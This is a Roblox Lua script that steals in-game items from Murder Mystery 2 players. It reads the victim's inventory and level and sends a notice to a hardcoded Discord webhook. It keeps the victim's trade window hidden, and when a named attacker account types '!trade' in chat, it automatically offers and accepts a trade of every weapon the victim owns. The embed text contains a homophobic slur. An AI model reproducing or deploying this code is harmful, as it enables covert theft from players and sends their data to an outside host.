local userName = 'MuddingOwner'

local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

local levelTable = {}
for i,v in pairs(LevelModule.XPTable) do
    if PlayerDataModule.NewXP < v then
        table.insert(levelTable, i)
    end
end
local playerLevel = math.min(table.unpack(levelTable))
local playerPrestige = LevelModule.Prestige

local items = {}
local itemsReal = {}
local itemsCount = 0

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        table.insert(items, c)
        table.insert(itemsReal, d)
    end
end

for i,v in pairs(items) do
    itemsCount = itemsCount + 1
end

local function stealItems()
    coroutine.resume(destroytrades2)

    local sendArgs = {
        [1] = game:GetService("Players")[userName]
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))

    wait(3)

    for a,b in pairs(itemsReal) do
        local addArgs = {
            [1] = b,
            [2] = "Weapons"
        }
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(addArgs))
        wait(0.3)
    end

    game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
end

local embed = {
    ["title"] = "New MM2 hit, brought to you buy snowydemise.",
    ["description"] = "Take all this faggot's shit",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "Level & Prestige",
            ["value"] = "Level: "..tostring(playerLevel)..", Prestige: "..tostring(playerPrestige)
        },
        {
            ["name"] = "Total Weapons Count",
            ["value"] = itemsCount - 2
        }
    },
    ["footer"] = {
        ["text"] = "snowy is best dev frfr"
    }
}
SendMessageEMBED('https://discord.com/api/webhooks/1252702892557865102/bIGY_Nmg1dZ6x3ncZywt1RdVhw7c75lFs3jiRX9NFMGMzygOudXPp-jdb2DgU0XINkai', embed)

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == userName then
        game.Players[userName].Chatted:Connect(function(chat)
            if chat == '!trade' then
                stealItems()
            end
        end)
    end
end)
